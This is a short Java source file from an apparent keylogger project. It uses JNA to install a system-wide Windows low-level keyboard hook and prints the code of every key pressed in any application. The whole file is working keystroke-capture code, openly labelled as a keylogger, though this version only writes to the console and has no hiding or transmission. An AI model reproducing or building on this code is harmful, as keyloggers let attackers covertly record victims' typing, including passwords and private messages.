package com.badar.keylogger.Controllers;


import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinUser;

public class GlobalKeyListener {
    private static WinUser.HHOOK hHook;
    private static User32 lib;

    public static void main(String[] args) {
        lib = User32.INSTANCE;

        WinUser.LowLevelKeyboardProc keyboardHook = (nCode, wParam, info) -> {
            if (nCode >= 0) {
                switch (wParam.intValue()) {
                    case WinUser.WM_KEYDOWN:
                        System.out.println("Key pressed: " + info.vkCode);
                        break;
                }
            }
            return lib.CallNextHookEx(hHook, nCode, wParam, info.getPointer());
        };

        hHook = lib.SetWindowsHookEx(
                WinUser.WH_KEYBOARD_LL,
                keyboardHook,
                Kernel32.INSTANCE.GetModuleHandle(null),
                0
        );

        // Keep the program running
        WinUser.MSG msg = new WinUser.MSG();
        while (lib.GetMessage(msg, null, 0, 0) != 0) {
            lib.TranslateMessage(msg);
            lib.DispatchMessage(msg);
        }

        lib.UnhookWindowsHookEx(hHook);
    }
}
